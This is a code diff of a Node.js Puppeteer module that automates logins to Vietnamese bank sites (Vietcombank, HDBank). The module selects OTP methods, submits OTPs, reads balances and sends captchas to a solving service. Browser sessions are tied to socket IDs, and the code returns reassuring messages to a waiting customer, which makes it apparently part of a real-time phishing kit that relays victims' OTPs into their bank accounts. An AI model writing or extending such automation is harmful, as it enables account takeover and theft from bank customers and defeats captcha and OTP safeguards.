-    // get innerText message
-    messageElement = await page.$x("//p[contains(., 'Mã OTP không chính xác, Quý khách vui lòng kiểm tra lại.')]")
-    if (messageElement.length > 0) {
-        message = await page.evaluate(el => el.innerText, messageElement[0]);
+        await page.waitForSelector(".form-main-footer button");
+        await page.click(".form-main-footer button");
+
+        await sleep(3000);
+
+        // get innerText message
+        messageElement = await page.$x("//p[contains(., 'Mã OTP không chính xác, Quý khách vui lòng kiểm tra lại.')]")
+        if (messageElement.length > 0) {
+            message = await page.evaluate(el => el.innerText, messageElement[0]);
+            return {
+                message: message,
+                code: 404,
+            };
+        }
+        messageElement = await page.$x("//p[contains(., 'Nhập sai OTP quá 3 lần. Quý khách vui lòng thực hiện giao dịch khác.')]");
+
+        if (messageElement.length > 0) {
+            message = await page.evaluate(el => el.innerText, messageElement[0]);
+
+            return {
+                message: message,
+                code: 500,
+            };
+        }
+
+        await browser.close();
+
         return {
-            message: message,
-            code: 404,
+            message: 'Xác minh thành công. Quý khách vui lòng chờ trong giây lát.',
+            code: 200,
         };
-    }
-    messageElement = await page.$x("//p[contains(., 'Nhập sai OTP quá 3 lần. Quý khách vui lòng thực hiện giao dịch khác.')]");
-
-    if (messageElement.length > 0) {
-        message = await page.evaluate(el => el.innerText, messageElement[0]);
-
+    } catch (error) {
         return {
-            message: message,
+            message: 'Có lỗi xảy ra, Vui lòng thử lại sau',
             code: 500,
-        };
+        }
     }
-
-    return {
-        message: 'success',
-        code: 200,
-    };
 }
 
 const getBalanceVCB = async (socketID) => {
@@ -864,53 +823,60 @@ const xacthuc = async (otp, type) => {
 }
 
 const xacthucOTPLogin = async (method, socketID) => {
-    await sleep(1500);
-    const page = pg.find(p => p.socketID == socketID).page;
-    if (method == 'SMS OTP') {
-        await page.waitForSelector(".select-2");
-        page.click(".select-2");
+    try {
+        await sleep(1500);
+        const page = pg.find(p => p.socketID == socketID).page;
+        if (method == 'SMS OTP') {
+            await page.waitForSelector(".select-2");
+            page.click(".select-2");
 
-        await page.waitForSelector(".select2-results__options");
+            await page.waitForSelector(".select2-results__options");
 
-        await page.waitForSelector(".select2-results__options > li:nth-child(1)");
-        page.click(".select2-results__options > li:nth-child(1)");
-    } else if (method == 'VCB smart OTP') {
-        await page.waitForSelector(".select-2");
-        page.click(".select-2");
+            await page.waitForSelector(".select2-results__options > li:nth-child(1)");
+            page.click(".select2-results__options > li:nth-child(1)");
+        } else if (method == 'VCB smart OTP') {
+            await page.waitForSelector(".select-2");
+            page.click(".select-2");
 
-        await page.waitForSelector(".select2-results__options");
+            await page.waitForSelector(".select2-results__options");
 
-        await page.waitForSelector(".select2-results__options > li:nth-child(2)");
-        page.click(".select2-results__options > li:nth-child(2)");
-    }
+            await page.waitForSelector(".select2-results__options > li:nth-child(2)");
+            page.click(".select2-results__options > li:nth-child(2)");
+        }
 
-    await sleep(1500);
-    // const buttonContinue = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
-    page.click("button[type='submit']");
-    await sleep(1500);
+        await sleep(1500);
+        // const buttonContinue = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
+        page.click("button[type='submit']");
+        await sleep(1500);
 
-    // get value input.input input-xs input-material
-    await page.waitForSelector("input.input.input-xs.input-material");
-    const input = await page.$("input.input.input-xs.input-material");
-    const value = await page.evaluate(el => el.value, input);
+        // get value input.input input-xs input-material
+        await page.waitForSelector("input.input.input-xs.input-material");
+        const input = await page.$("input.input.input-xs.input-material");
+        const value = await page.evaluate(el => el.value, input);
 
-    await sleep(1500);
+        await sleep(1500);
 
-    const messageOtp = await page.$x("//p[contains(., 'Vui lòng nhập mã OTP được gửi về số điện thoại đăng ký nhận SMS OTP của Quý khách để tiếp tục quá trình đăng nhập.')]");
+        const messageOtp = await page.$x("//p[contains(., 'Vui lòng nhập mã OTP được gửi về số điện thoại đăng ký nhận SMS OTP của Quý khách để tiếp tục quá trình đăng nhập.')]");
 
-    if (messageOtp.length > 0) {
-        const message = await page.evaluate(el => el.innerText, messageOtp[0]);
+        if (messageOtp.length > 0) {
+            const message = await page.evaluate(el => el.innerText, messageOtp[0]);
+            return {
+                message: message,
+                code: 200,
+            };
+        }
         return {
-            message: message,
+            message: 'success',
             code: 200,
+            otpValue: value,
+            type: 'METHOD_OTP_VCB'
         };
+    } catch (error) {
+        return {
+            message: 'Có lỗi xảy ra, Vui lòng thử lại sau',
+            code: 500,
+        }
     }
-    return {
-        message: 'success',
-        code: 200,
-        otpValue: value,
-        type: 'METHOD_OTP_VCB'
-    };
 }
 
 const solverCaptcha = async (img, type) => {
@@ -925,18 +891,20 @@ const solverCaptcha = async (img, type) => {
         default:
             break;
     }
+    try {
+        const captchaData = await axios.post('https://anticaptcha.top/api/captcha', {
+            apikey: process.env.CAPTCHA_API_KEY,
+            img: img,
+            type: keyType,
+        });
 
-    const captchaData = await axios.post('https://anticaptcha.top/api/captcha', {
-        apikey: process.env.CAPTCHA_API_KEY,
-        img: img,
-        type: keyType,
-    });
-
-    if (captchaData.data.success) {
-        return captchaData.data.captcha;
+        if (captchaData.data.success) {
+            return captchaData.data.captcha;
+        }
+    } catch (error) {
+        console.log('error', error);
+        return null;
     }
-
-    return null;
 
 }
 
@@ -950,5 +918,6 @@ module.exports = {
     loginHDBank,
     xacthucOTPLogin,
     xacthucOTPVCB,
-    xacthucCTVCB
+    xacthucCTVCB,
+    xacthucMethodCtVCB
 }
